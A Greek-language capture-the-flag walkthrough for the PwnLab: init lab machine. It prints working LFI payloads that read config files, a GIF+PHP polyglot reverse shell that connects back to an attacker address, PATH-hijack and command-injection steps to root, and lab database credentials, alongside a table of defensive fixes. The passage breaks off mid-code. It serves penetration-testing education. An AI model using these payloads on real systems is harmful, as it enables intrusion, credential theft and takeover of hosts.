# Μηχάνημα 10 — PwnLab: init

> **Θέση:** 10 από 13 · **Ζώνη 3 — Εύκολο** (παγκόσμια θέση **057** από 708)
> **Πλήρες walkthrough:** [`labs/3-057-pwnlab-init/README.md`](../../labs/3-057-pwnlab-init/README.md)

| | |
| --- | --- |
| **Μηχάνημα** | PwnLab: init |
| **Δημιουργός** | Claor |
| **Κυκλοφορία** | 1 Αυγούστου 2016 |
| **Σύμβαση** | **Καμία σημαία.** Ο στόχος είναι **root** — τεκμηριώστε με `id`, `cat /root/root.txt` |
| **Στόχος** | Debian — Apache 2.4.10, PHP, **MySQL εκτεθειμένη στο 3306**, `rpcbind` στο 111, kernel **3.16 32-bit** |
| **VulnHub** | [entry/pwnlab-init,158](https://vulnhub.com/entry/pwnlab-init,158/) |
| **Εκτιμώμενος χρόνος** | 5–8 ώρες |

---

## Γιατί είναι εδώ αυτό το μηχάνημα

Επειδή είναι **το μηχάνημα Local File Inclusion** της διαδρομής — και διδάσκει το LFI **σωστά**,
με **τρεις διαφορετικούς τρόπους σε ένα κουτί**:

1. **Παράμετρος GET:** `index.php?page=` φτάνει σε μια `include()` **χωρίς καμία επικύρωση**.
2. **`php://filter`:** ο wrapper που επιστρέφει **τον πηγαίο κώδικα** ενός αρχείου PHP **αντί
   για την εκτελεσμένη έξοδό του**. **Έτσι διαβάζετε το `config.php` και παίρνετε τον κωδικό
   της βάσης** — **η πιο χρήσιμη τεχνική LFI που υπάρχει.**
3. **Cookie:** ένα **δεύτερο, ανεξάρτητο** σημείο inclusion μέσω cookie `lang`, **χωρίς
   προσάρτηση `.php`** — **που είναι αυτό που του επιτρέπει να συμπεριλάβει την εικόνα σας και
   άρα να την ΕΚΤΕΛΕΣΕΙ.**

**Αυτή η τρίτη λεπτομέρεια είναι ολόκληρο το δίδαγμα:** δύο σημεία inclusion **με διαφορετικά
φίλτρα**. **Βρείτε το πιο χαλαρό.**

Μετά, η αναβάθμιση είναι **αλυσίδα SUID δύο σταδίων**:

- **Στάδιο 1:** SUID binary που καλεί **`cat` ΧΩΡΙΣ απόλυτη διαδρομή** → **PATH hijack** →
  γίνεστε **`mike`**.
- **Στάδιο 2:** SUID-**root** helper που **συνενώνει την είσοδό σας μέσα σε εντολή κελύφους** →
  **command injection** → γίνεστε **root**.

**Δύο από τα πιο σημαντικά primitives της αναβάθμισης προνομίων Linux, το ένα πίσω από το άλλο.**

## Στόχοι μάθησης

1. Να κάνετε **σάρωση δύο σταδίων** (όλες οι θύρες γρήγορα → έπειτα λεπτομερώς μόνο όσες
   βρήκατε) και να καταλάβετε **γιατί**.
2. Να ερμηνεύσετε **`MySQL (unauthorized)`** σωστά — **δεν** σημαίνει «σπασμένο».
3. Να **επιβεβαιώσετε LFI** διαβάζοντας `/etc/passwd` — και να **διαβάσετε το μήνυμα
   σφάλματος** για να μάθετε **τον κώδικα**.
4. Να χρησιμοποιήσετε **`php://filter/convert.base64-encode/resource=`** και να καταλάβετε
   **γιατί** παρακάμπτει την προσάρτηση `.php`.
5. Να διακρίνετε **base64** από **hash** (το `==` είναι το σημάδι).
6. Να φτιάξετε **polyglot GIF+PHP** και να καταλάβετε τι ικανοποιεί το **`getimagesize()`**.
7. Να εκμεταλλευτείτε **PATH hijack** σε SUID binary.
8. Να εκμεταλλευτείτε **command injection** σε SUID-root helper.
9. Να **επαναφέρετε** το `$PATH` σας μετά.

## Κατηγορίες επίθεσης που καλύπτονται

| Κατηγορία | Πού σε αυτό το μηχάνημα |
| --- | --- |
| **LFI σε παράμετρο GET** | `index.php?page=` → `include($_GET['page'].".php")` |
| **Αποκάλυψη πηγαίου κώδικα** | **`php://filter/convert.base64-encode/resource=config`** → `root:H4u%QJ_H99` |
| **Διαπιστευτήρια βάσης σε κώδικα** | `config.php` → `$user="root"`, `$pass="H4u%QJ_H99"`, `$database="Users"` |
| **Αντιστρεπτή αποθήκευση κωδικών** | Ο πίνακας `Users` έχει **base64**, όχι hash → **η εφαρμογή τους αποκωδικοποιεί** |
| **Φίλτρο upload** | Whitelist **`jpg,jpeg,png,gif`** + MIME + **`getimagesize()`** + όνομα **`md5(…).ext`** |
| **Polyglot** | **`GIF89a`** header + PHP reverse shell → `shell.gif` |
| **LFI σε cookie** | `$_COOKIE['lang']` → `include()` **ΧΩΡΙΣ `.php`** |
| **Επανάχρηση διαπιστευτηρίων** | Κωδικός βάσης = **κωδικός συστήματος** (`su kane`) |
| **PATH hijack σε SUID** | `msgmike` καλεί **`cat`** χωρίς `/` → `/home/kane/cat` |
| **Command injection σε SUID root** | `msg2root` → `/bin/echo %s >> /root/messages.txt` |

## Διαβάστε πρώτα

- [02 — Επιθέσεις στο Web](<../02-Επιθέσεις-στο-Web.md>) — **§9** (**Local File Inclusion** — το
  κεφάλαιο που γράφτηκε για αυτό το μηχάνημα) και **§8** (upload filters).
- [05 — Αναβάθμιση Προνομίων Linux](<../05-Αναβάθμιση-Προνομίων-Linux.md>) — **§2** (SUID),
  **§7** (**PATH hijack**) και **§8** (command injection σε προνομιούχα binaries).
- [03 — Επιθέσεις σε Υπηρεσίες](<../03-Επιθέσεις-σε-Υπηρεσίες.md>) — **§6.1** (MySQL: socket
  έναντι TCP).
- [06 — Κελύφη, Εμμονή και Διαφυγές](<../06-Κελύφη-Εμμονή-και-Διαφυγές.md>) — **§2** και **§3**.
- Αγγλική έκδοση:
  [Machine 10](<../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/10-pwnlab-init.md>)

## Πριν ξεκινήσετε — απαντήστε

1. Γιατί κάνετε **δύο** σαρώσεις αντί για μία;
2. Τι **δεν** σημαίνει το `MySQL (unauthorized)`;
3. Αν το LFI προσθέτει `.php`, πώς διαβάζετε **το `config.php`**;
4. Γιατί το **cookie** μπορεί να συμπεριλάβει **`.gif`** ενώ η **παράμετρος** δεν μπορεί;
5. Τι σημαίνει **`-rwsr-sr-x`** θέση προς θέση;

## Κλίμακα υποδείξεων

<details>
<summary><strong>Σκαλοπάτι 1 — μια ώθηση</strong></summary>

**Τρεις θύρες: 80, 111, 3306.**

- **80** → εφαρμογή PHP με **`?page=`** στους συνδέσμους. **Οποιαδήποτε εφαρμογή PHP που βάζει
  όνομα αρχείου σε query string είναι υποψήφια για file inclusion.**
- **3306** → **MySQL (unauthorized)**. **Δεν είναι αδιέξοδο** — σημαίνει **η IP σας δεν είναι στη
  λίστα πρόσβασης**. **Αν βρείτε διαπιστευτήρια, ανοίγει.**
- **111** → rpcbind. **Εδώ δεν χρησιμεύει.**

**Δοκιμάστε:** `curl -s "http://TARGET/index.php?page=/etc/passwd"` — **και διαβάστε το μήνυμα
σφάλματος.**
</details>

<details>
<summary><strong>Σκαλοπάτι 2 — προς τα πού να πάτε</strong></summary>

```text
 1. sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports TARGET
    sudo nmap -sC -sV -p 80,111,3306 -oA scans/services TARGET
 2. curl -s "http://TARGET/index.php?page=/etc/passwd"
    → Warning: include(/etc/passwd.php): failed to open stream … on line 14
    → **Η εφαρμογή προσθέτει .php**
 3. curl -s "…?page=php://filter/convert.base64-encode/resource=config" | base64 -d
    → root : H4u%QJ_H99 : Users
 4. mysql -h TARGET -u root -p → USE Users; SELECT * FROM Users;
    → kent / mike / kane με **base64** κωδικούς
 5. for h in …; do printf '%s' "$h" | base64 -d; echo; done
 6. LFI στο upload.php → whitelist jpg,jpeg,png,gif + getimagesize + md5(όνομα).ext
 7. Πολύγλωσσο: printf 'GIF89a;\n' | cat - shell.php > shell.gif
 8. Upload ως daisa/kent → διαβάστε το τυπωμένο όνομα
 9. nc -lvnp 4444
    curl -s -b "lang=upload/<MD5>.gif" "http://TARGET/index.php?page=index"
10. python -c 'import pty; pty.spawn("/bin/bash")'   ← **python, όχι python3**
11. su kane (κωδικός από τη βάση)
12. strings /home/kane/msgmike → "cat /home/mike/msg.txt"   ← **ΧΩΡΙΣ /**
13. PATH hijack → mike
14. strings /home/mike/msg2root → "/bin/echo %s >> /root/messages.txt"
15. Command injection → root
```
</details>

<details>
<summary><strong>Σκαλοπάτι 3 — γιατί το <code>php://filter</code> παρακάμπτει το <code>.php</code></strong></summary>

**Το πρόβλημα:** ο κώδικας είναι

```php
include($_GET['page'].".php");
```

**Άρα `?page=/etc/passwd` γίνεται `include("/etc/passwd.php")` — που δεν υπάρχει.**

**Η λύση:** ο **stream wrapper** μπαίνει **ΜΠΡΟΣΤΑ**:

```text
php://filter/convert.base64-encode/resource=config
                                     + ".php"
→ php://filter/convert.base64-encode/resource=config.php
```

**Το προσαρτημένο `.php` γίνεται ΜΕΡΟΣ του ονόματος του πόρου — και το `config.php` ΥΠΑΡΧΕΙ.**

**Τι κάνει ο wrapper:** λέει στην PHP **«πέρασε το αρχείο από έναν κωδικοποιητή base64 ΠΡΙΝ το
συμπεριλάβεις»** — άρα **παίρνετε τον ΠΗΓΑΙΟ ΚΩΔΙΚΑ ως κείμενο**, όχι την εκτελεσμένη έξοδο.

**Αυτό είναι το πιο χρήσιμο LFI primitive στην PHP:** **διαβάζει πηγαίο κώδικα**, και έτσι
ανακτάτε **`wp-config.php`, `configuration.php`, `.env`, `config/database.php`** — **δηλαδή
ΚΑΘΕ διαπιστευτήριο βάσης στο μηχάνημα.**

**Προσοχή στον κωδικό `H4u%QJ_H99`:** περιέχει **`%`**, χαρακτήρα που **καταστρέφεται σε URL**.
**Χρησιμοποιήστε τον κυριολεκτικά σε MySQL client, ΟΧΙ σε query string.**
</details>

<details>
<summary><strong>Σκαλοπάτι 4 — γιατί το cookie δουλεύει και η παράμετρος όχι</strong></summary>

**Δύο σημεία inclusion, ΔΥΟ διαφορετικά φίλτρα:**

| Σημείο | Κώδικας | Προσαρτά `.php`; | Μπορεί `.gif`; |
| --- | --- | --- | --- |
| **`?page=`** | `include($_GET['page'].".php")` | **ΝΑΙ** | **ΟΧΙ** |
| **cookie `lang`** | `if (isset($_COOKIE['lang'])) { include($_COOKIE['lang']); }` | **ΟΧΙ** | **ΝΑΙ** |

**Άρα:**

```bash
nc -lvnp 4444                                                       # Kali, πρώτα
curl -s -b "lang=upload/<MD5>.gif" "http://TARGET/index.php?page=index"
```

**`-b "NAME=VALUE"`** στέλνει cookie. **Αυτό είναι cookie-based LFI**, και **παρακάμπτει τον
περιορισμό «μόνο `.php`» της παραμέτρου `page`**.

**Δύο ανεξάρτητα σημεία inclusion με διαφορετικά φίλτρα είναι ΣΥΧΝΟ σε πραγματικό κώδικα.**
**Βρείτε το πιο χαλαρό.**

**Και το polyglot:** το **`GIF89a`** είναι η **εξαψήφια μαγική υπογραφή** που **κάθε βιβλιοθήκη
εικόνων ελέγχει**. **Προθέτοντάς την, ικανοποιείτε ΚΑΙ το `getimagesize()` ΚΑΙ τη whitelist
επεκτάσεων.** **Η PHP αγνοεί τα πάντα έξω από `<?php … ?>`**, άρα η κεφαλίδα GIF είναι **αδρανής**
και ο κώδικας μετά **τρέχει** — **με την προϋπόθεση ότι το αρχείο ΣΥΜΠΕΡΙΛΑΜΒΑΝΕΤΑΙ ως PHP.**
</details>

<details>
<summary><strong>Σκαλοπάτι 5 — η απάντηση</strong></summary>

```bash
# Σάρωση δύο σταδίων
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports TARGET
sudo nmap -sC -sV -p 80,111,3306 -oA scans/services TARGET

# Επιβεβαίωση LFI
curl -s "http://TARGET/index.php?page=/etc/passwd"

# Πηγαίος κώδικας
curl -s "http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=config" \
  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d

# Βάση
mysql -h TARGET -u root -p'H4u%QJ_H99' -D Users -e "SELECT * FROM Users;"
for h in S0k3an1jZmFuc2tp U2Ztb2RvbnM= a2FuZQ==; do printf '%s' "$h" | base64 -d; echo; done

# Πολύγλωσσο
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
sed -i "s/127.0.0.1/ATTACKER/" shell.php && sed -i "s/1234/4444/" shell.php
grep -n '^\$ip\|^\$port' shell.php
printf 'GIF89a;\n' | cat - shell.php > shell.gif && file shell.gif

# Upload (ως πιστοποιημένος χρήστης) → σημειώστε το τυπωμένο όνομα
nc -lvnp 4444
curl -s -b "lang=upload/<MD5>.gif" "http://TARGET/index.php?page=index"
python -c 'import pty; pty.spawn("/bin/bash")'

# PATH hijack
su kane
strings /home/kane/msgmike | grep -iE 'cat|/bin|/usr'
cd /home/kane && printf '#!/bin/bash\n/bin/bash -i\n' > cat && chmod +x cat
export PATH=/home/kane:$PATH && /home/kane/msgmike && id
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   # ΕΠΑΝΑΦΟΡΑ

# Command injection
strings /home/mike/msg2root
/home/mike/msg2root
# Message for root: ; /bin/bash -p
id ; cat /root/root.txt
```
</details>

## Μετά το τέλος — ερωτήσεις επανάληψης

<details>
<summary><b>1.</b> Γιατί δύο σαρώσεις αντί για μία;</b></summary>

Επειδή **οι δύο εργασίες έχουν αντίθετες απαιτήσεις**:

| Σάρωση | Τι κάνει | Ταχύτητα |
| --- | --- | --- |
| **`-p- --min-rate 1000`** | **Βρες ποιες θύρες είναι ανοιχτές** — χωρίς version detection, χωρίς scripts | **Γρήγορη** (λεπτά για 65.535 θύρες) |
| **`-sC -sV -p <λίστα>`** | **Μάθε τι τρέχει** σε κάθε ανοιχτή θύρα | **Αργή** (NSE scripts + fingerprinting) |

**Το `--min-rate 1000` είναι ΚΑΤΩΦΛΙ probes ανά δευτερόλεπτο** — **αυτό κάνει μια πλήρη σάρωση
65.535 θυρών να τελειώνει σε λεπτά, όχι ώρες.**

**Το version detection και τα NSE scripts είναι ΑΡΓΑ**, άρα **το να τα τρέξετε σε όλες τις
65.535 θύρες είναι σπατάλη.** **Σαρώστε πρώτα φτηνά, μετά ακριβά μόνο ό,τι βρήκατε.**

**Αυτή είναι η επαγγελματική συνήθεια** — και **ο λόγος που το `-oA` (όλες οι μορφές) έχει
σημασία**: κρατάτε **και** τα δύο αποτελέσματα.
</details>

<details>
<summary><b>2.</b> Τι ΔΕΝ σημαίνει το <code>MySQL (unauthorized)</code>;</b></summary>

**Δεν σημαίνει «σπασμένο» ή «εκμεταλλεύσιμο».** Σημαίνει:

> Ο εξυπηρετητής **αρνήθηκε** το probe του nmap επειδή **η IP σας δεν είναι στη λίστα πρόσβασής
> του** (`GRANT … TO 'user'@'host'`).

**Αυτό είναι ένας έλεγχος ΠΟΥ ΛΕΙΤΟΥΡΓΕΙ.**

**Αλλά σας λέει και δύο ακόμα πράγματα:**
1. **Υπάρχει βάση δεδομένων εκεί.**
2. **Είναι προσβάσιμη ΑΝ βρείτε διαπιστευτήρια** — **που είναι ακριβώς αυτό που συμβαίνει.**

**Το δίδαγμα:** *μια άρνηση σύνδεσης είναι πληροφορία, όχι αδιέξοδο.* **Σημειώστε την και
γυρίστε πίσω όταν έχετε κωδικό.**

**Και για την άμυνα:** **`bind-address = 127.0.0.1`** στο `my.cnf` **αν η βάση δεν
χρειάζεται να ακούει στο δίκτυο.** Εδώ ακούει στο **0.0.0.0:3306** — **εύρημα**.
</details>

<details>
<summary><b>3.</b> Διαβάστε το μήνυμα σφάλματος του LFI.</b></summary>

```text
Warning: include(/etc/passwd.php): failed to open stream: No such file or directory
in /var/www/html/index.php on line 14
```

**Τέσσερα γεγονότα σε ένα μήνυμα:**

| Τμήμα | Τι μαθαίνετε |
| --- | --- |
| **`include(/etc/passwd.php)`** | **Η `page` ΠΕΡΝΑΕΙ στην `include()`** — **LFI επιβεβαιωμένο** |
| **`.php` στο τέλος** | **Η εφαρμογή ΠΡΟΣΑΡΤΑ `.php`** → `include($_GET['page'].".php")` |
| **`/var/www/html/index.php`** | **Η ΑΠΟΛΥΤΗ διαδρομή** του αρχείου — **document root** |
| **`on line 14`** | **Η γραμμή** — **χρήσιμο αν έχετε ανάγνωση πηγαίου κώδικα** |

**Ποτέ μην διορθώσετε ένα φίλτρο μαντεύοντας· κάντε την εφαρμογή να σας ΔΕΙΞΕΙ τον κώδικά της.**
**Εδώ το μήνυμα σφάλματος ΤΟ ΚΑΝΕΙ.**

**Αυτό είναι το δίδαγμα: τα `display_errors = On` είναι ΕΥΠΑΘΕΙΑ.** **Σε παραγωγή πρέπει να είναι
`Off`** — **και το `log_errors = On`**.
</details>

<details>
<summary><b>4.</b> Γιατί η αποθήκευση κωδικών σε base64 είναι ΧΕΙΡΟΤΕΡΗ από καθαρό κείμενο;</b></summary>

Επειδή **δημιουργεί ψευδαίσθηση προστασίας**.

**Καθαρό κείμενο:** όποιος δει τη βάση **ξέρει** ότι οι κωδικοί είναι εκτεθειμένοι. **Υπάρχει
πίεση για διόρθωση.**

**base64:** φαίνεται «κρυπτογραφημένο»· **κανείς δεν το αμφισβητεί**· **και η εφαρμογή πρέπει να
το ΑΠΟΚΩΔΙΚΟΠΟΙΕΙ** — **που σημαίνει ότι κρατά τον μηχανισμό αποκωδικοποίησης**.

**Η κρίσιμη συνέπεια:** *οποιοσδήποτε με ανάγνωση βάσης παίρνει ΚΑΘΕ κωδικό ΔΩΡΕΑΝ.*
**Κατακερματισμός (`password_hash()`) θα καθιστούσε αυτή τη λίστα ΑΧΡΗΣΤΗ.**

**Το `==` στο τέλος είναι το σημάδι:**

| Μορφή | Τι είναι |
| --- | --- |
| **`a2FuZQ==`** | **base64** (συμπλήρωμα `==`) |
| **`$2y$10$…`** | **bcrypt** |
| **`$S$…`** | **phpass** |
| **32 hex, κανένα πρόθεμα** | **unsalted MD5** |

**Δοκιμή:** `printf '%s' 'a2FuZQ==' | base64 -d` → **`kane`**. **Ένας κωδικός που είναι το ίδιο
το username.**
</details>

<details>
<summary><b>5.</b> Διαβάστε το <code>-rwsr-sr-x</code> θέση προς θέση.</b></summary>

```text
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike
```

| Θέση | Χαρακτήρας | Σημασία |
| --- | --- | --- |
| **1** | **`-`** | **Κανονικό αρχείο** (όχι κατάλογος `d`, όχι symlink `l`) |
| **2–4** | **`rws`** | **Owner: read + write + SUID** |
| **5–7** | **`r-s`** | **Group: read + SGID** (χωρίς write) |
| **8–10** | **`r-x`** | **Other: read + execute** |

**Το `s` στη θέση του OWNER είναι SUID.** **Το `s` στη θέση του GROUP είναι SGID.**

**Και ο ιδιοκτήτης είναι `mike`** — **άρα όποιος τρέχει το `msgmike`, το τρέχει ΩΣ mike**,
**ανεξάρτητα από το ποιος είναι**.

**Αυτό είναι το στάδιο 1 της αλυσίδας:** **`kane` → `mike`**.

**Το δεύτερο binary:**

```text
-rwsr-xr-x 1 root root 5364 Mar 17  2016 msg2root
```

**`rws` + ιδιοκτήτης `root`** → **SUID root**. **Αυτό είναι το στάδιο 2: `mike` → `root`.**

**Η αλυσίδα είναι: `www-data` → `kane` (κωδικός) → `mike` (PATH hijack) → `root` (command
injection).** **Τέσσερα άλματα, τρεις διαφορετικοί μηχανισμοί.**
</details>

## Αμυντικός στοχασμός

| Ευπάθεια | Διόρθωση |
| --- | --- |
| **`include($_GET['page'].".php")`** | **Whitelist σελίδων** (`$allowed = ['home','login']; if (!in_array($_GET['page'], $allowed)) die;`) |
| **`display_errors = On`** | **`Off`** σε παραγωγή + **`log_errors = On`** |
| **Διαπιστευτήρια βάσης σε `config.php`** | Αναπόφευκτο — **άρα: ξεχωριστός λογαριασμός με δικαιώματα μόνο στη βάση εφαρμογής, ποτέ `root`** |
| **MySQL στο 0.0.0.0:3306** | **`bind-address = 127.0.0.1`** |
| **Κωδικοί σε base64** | **`password_hash($pw, PASSWORD_ARGON2ID)`** |
| **Upload μέσα στο document root** | **Αποθήκευση ΕΚΤΟΣ** web root + **εξυπηρέτηση μέσω σεναρίου** |
| **`getimagesize()` ως έλεγχος** | **Δεν αρκεί** — **επανεκκωδικοποίηση** της εικόνας (ImageMagick) **καταστρέφει** το polyglot |
| **`msgmike` με SUID που καλεί `cat` χωρίς `/`** | **Απόλυτες διαδρομές ΠΑΝΤΑ** + **`secure_path`** + **καμία κλήση κελύφους από SUID** |
| **`msg2root` με SUID root** | **ΑΦΑΙΡΕΣΗ.** **Καμία δικαιολογία** για SUID binary που συνενώνει είσοδο χρήστη σε εντολή |
| **`export PATH` από χρήστη** | **`Defaults secure_path=…`** στο sudoers + **`env_reset`** |

**Το μεγαλύτερο δίδαγμα:** *ένα SUID binary που καλεί κέλυφος είναι μια εντολή root που δέχεται
είσοδο.* **Και οι δύο μηχανισμοί εδώ — PATH hijack και command injection — είναι **συνέπειες
αυτής της πρότασης**.

---

## Οι εντολές, αναλυτικά — κάθε είσοδος και κάθε έξοδος

`TARGET` = **192.168.56.101**, `ATTACKER` = **192.168.56.10**.

### 1. Σάρωση δύο σταδίων

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports TARGET
sudo nmap -sC -sV -p 80,111,3306 -oA scans/services TARGET
```

```text
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: PwnLab Intranet Image hosting
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100024  1          40879/tcp   status
|_  100024  1          54321/udp   status
3306/tcp open  mysql   MySQL (unauthorized)
```

**`--min-rate 1000`** είναι **κάτωφλι probes ανά δευτερόλεπτο** — **αυτό κάνει μια πλήρη σάρωση
65.535 θυρών να τελειώνει σε λεπτά, όχι ώρες.**

**Μετά, ΜΙΑ ΔΕΥΤΕΡΗ, ΣΤΟΧΕΥΜΕΝΗ σάρωση ΜΟΝΟ στις θύρες που βρήκατε:** **το version detection και
τα NSE scripts είναι αργά**, άρα **το να τα τρέξετε σε όλες τις 65.535 θύρες είναι σπατάλη.**

**Διαβάστε το `MySQL (unauthorized)` προσεκτικά.** **ΔΕΝ σημαίνει σπασμένο ή εκμεταλλεύσιμο** —
σημαίνει ότι **ο εξυπηρετητής αρνήθηκε το probe του nmap επειδή η IP σας δεν είναι στη λίστα
πρόσβασής του** (`GRANT … TO 'user'@'host'`).

**Αυτό είναι ένας έλεγχος που λειτουργεί.** **Και σας λέει επίσης ότι υπάρχει βάση εκεί, και ότι
είναι προσβάσιμη αν βρείτε διαπιστευτήρια** — **που είναι ακριβώς αυτό που συμβαίνει.**

**`-oA`** γράφει **`.nmap`, `.xml` και `.gnmap`** μαζί — **κρατάτε και τα δύο στάδια.**

### 2. Η εφαρμογή και η ορατή επιφάνειά της

```bash
curl -s http://TARGET/ | head -30
nikto -h http://TARGET/
```

```text
<html>
 <body>
  <center>
   <a href="index.php?page=home">[ Home ]</a>
   <a href="index.php?page=login">[ Login ]</a>
   <a href="index.php?page=upload">[ Upload ]</a>
  </center>
 </body>
</html>
```

**Τρεις σύνδεσμοι, και `?page=` στα URLs.**

**Οποιαδήποτε εφαρμογή PHP που βάζει όνομα αρχείου σε query string είναι υποψήφια για file
inclusion.**

**Το `nikto`** τρέχει **~7.000 ελέγχους** για **κακές ρυθμίσεις εξυπηρετητή** και **επικίνδυνα
αρχεία**. **Εδώ προσθέτει λίγα**, αλλά είναι **baseline δύο λεπτών** και **μερικές φορές σας
δίνει ένα `/phpmyadmin/` ή ένα ξεχασμένο `.bak`**.

### 3. Επιβεβαίωση του LFI

```bash
curl -s "http://TARGET/index.php?page=/etc/passwd"
```

```text
<br />
<b>Warning</b>:  include(/etc/passwd.php): failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>14</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '/etc/passwd.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in <b>/var/www/html/index.php</b> on line <b>14</b><br />
```

**Δύο γεγονότα σε αυτό το ένα σφάλμα:**

1. **Η `page` ΠΕΡΝΑΕΙ στην `include()`** — **επιβεβαίωση Local File Inclusion**
2. **Η εφαρμογή ΠΡΟΣΑΡΤΑ `.php`** → **`include($_GET['page'].".php")`**

**Αυτή η κατάληξη είναι ο λόγος που το `/etc/passwd` μόνο του αποτυγχάνει:** **η PHP ψάχνει το
`/etc/passwd.php`.**

**Και η δεύτερη γραμμή αποκαλύπτει το `include_path`:** **`.:/usr/share/php:/usr/share/pear`** —
**άρα ένα ΣΧΕΤΙΚΟ όνομα θα ψαχτεί σε τρεις καταλόγους.** **Αυτό είναι χρήσιμο για αργότερα.**

**Ποτέ μην διορθώσετε ένα φίλτρο μαντεύοντας· κάντε την εφαρμογή να σας δείξει τον κώδικά της.**
**Η προειδοποίηση ονομάζει ΑΚΟΜΑ και το αρχείο και τη γραμμή.**

**Δοκιμή με null byte (για παλιά PHP < 5.3.4):**

```bash
curl -s "http://TARGET/index.php?page=/etc/passwd%00"
```

**Εδώ δεν δουλεύει** — **η PHP είναι νεότερη**. **Άρα χρειάζεστε τον wrapper.**

### 4. Παράκαμψη της κατάληξης με stream wrapper

```bash
curl -s "http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=config" \
  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
```

```php
<?php
$server = "localhost";
$user   = "root";
$pass   = "H4u%QJ_H99";
$database = "Users";
?>
```

**Το `php://filter/convert.base64-encode/resource=FILE`** λέει στην PHP να **περάσει το `FILE`
από έναν κωδικοποιητή base64 ΠΡΙΝ το συμπεριλάβει** — **άρα παίρνετε τον ΠΗΓΑΙΟ ΚΩΔΙΚΑ ως
κείμενο, αντί για την εκτελεσμένη έξοδό του.**

**Επειδή ο wrapper κάθεται ΜΠΡΟΣΤΑ, το προσαρτημένο `.php` είναι αβλαβές:**

```text
php://filter/…/resource=config  +  ".php"   →   php://filter/…/resource=config.php
```

**Αυτό είναι το πιο χρήσιμο LFI primitive στην PHP: διαβάζει ΠΗΓΑΙΟ ΚΩΔΙΚΑ**, και έτσι
ανακτάτε **`wp-config.php`, `configuration.php`, `.env`, `config/database.php`** — **δηλαδή
κάθε διαπιστευτήριο βάσης στο μηχάνημα.**

**Σημειώστε: ο κωδικός περιέχει `%`**, χαρακτήρα που **θα καταστρεφόταν σε URL**.
**Χρησιμοποιήστε τον κυριολεκτικά σε MySQL client, όχι σε query string.**

**Ανάλυση του pipeline:**

| Τμήμα | Ρόλος |
| --- | --- |
| **`curl -s`** | **Αθόρυβα** — καμία μπάρα προόδου μέσα στο pipe |
| **`grep -oE '[A-Za-z0-9+/=]{40,}'`** | **Απομονώνει ΜΟΝΟ το base64 blob** από την HTML. **`{40,}`** = τουλάχιστον 40 χαρακτήρες, ώστε να μην ταιριάξει με μικρά τμήματα |
| **`base64 -d`** | **Αποκωδικοποίηση** |

> **Το base64 δεν είναι μυστικό.** Υπάρχει ώστε **δυαδικά δεδομένα να επιζούν σε μέσα μόνο
> κειμένου**. **Το να το βλέπετε να «προστατεύει» έναν κωδικό είναι ΕΥΡΗΜΑ, όχι άμυνα** — και
> **μπορεί να είναι ΦΩΛΙΑΣΜΕΝΟ**: αποκωδικοποιήστε, **μετά ελέγξτε αν το αποτέλεσμα είναι και
> το ίδιο base64 ή hex**.

### 5. Άδειασμα της βάσης

```bash
mysql -h TARGET -u root -p'H4u%QJ_H99' -D Users -e "SELECT * FROM Users;"
```

```text
+------+------------------------+
| User | Password               |
+------+------------------------+
| kent | S0k3an1jZmFuc2tp        |
| mike | U2Ztb2RvbnM=            |
| kane | a2FuZQ==                |
+------+------------------------+
```

| Flag | Ρόλος |
| --- | --- |
| **`-h TARGET`** | **Επιβάλλει TCP.** **Χωρίς αυτό, η MySQL χρησιμοποιεί Unix socket και πιστοποιεί ΜΕ UID αντί για κωδικό** — **δύο διαφορετικοί μηχανισμοί** |
| **`-u root`** | **Χρήστης** |
| **`-p'…'`** | **Κωδικός** — **χωρίς κενό** μετά το `-p`, **με μονά εισαγωγικά** γιατί περιέχει **`%`** |
| **`-D Users`** | **Βάση** |
| **`-e "…"`** | **Εκτέλεσε και βγες** — **προγραμματίσιμη** |

**Το `==` είναι το σημάδι ότι αυτά είναι BASE64, ΟΧΙ hashes.**

**Αποκωδικοποιήστε το καθένα:**

```bash
for h in S0k3an1jZmFuc2tp U2Ztb2RvbnM= a2FuZQ==; do printf '%s' "$h" | base64 -d; echo; done
```

```text
kent:jW3jfanski
mike:Sfmodons
kane:kane
```

| Τμήμα | Ρόλος |
| --- | --- |
| **`for h in A B C; do … done`** | **Επανάληψη** |
| **`printf '%s' "$h"`** | **Αποφεύγει το trailing newline του `echo`** πριν την αποκωδικοποίηση |
| **`; echo`** | **Προσθέτει newline ΜΕΤΑ**, ώστε τα αποτελέσματα να μην κολλήσουν |

**Οι ακριβείς συμβολοσειρές διαφέρουν ελαφρώς μεταξύ αναθεωρήσεων της εικόνας**, αλλά **το μοτίβο
είναι πάντα τρεις χρήστες με κωδικούς κωδικοποιημένους σε base64**.

**Σημειώστε ότι οι κωδικοί αποθηκεύονταν ΑΝΤΙΣΤΡΕΠΤΑ** — **που σημαίνει ότι η εφαρμογή τους
αποκωδικοποιεί**, **που σημαίνει ότι τους κρατά σε μορφή που ένας επιτιθέμενος με ανάγνωση
βάσης παίρνει ΔΩΡΕΑΝ**. **Ο κατακερματισμός (`password_hash()`) θα καθιστούσε αυτή τη λίστα
άχρηστη.**

### 6. Διαβάστε το `upload.php` ΠΡΙΝ ανεβάσετε

```bash
curl -s "http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=upload" \
  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
```

```php
<?php
$whitelist = array('jpg','jpeg','png','gif');
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (!in_array($ext, $whitelist)) die('Not an image');
if (!getimagesize($_FILES['file']['tmp_name'])) die('Not an image');
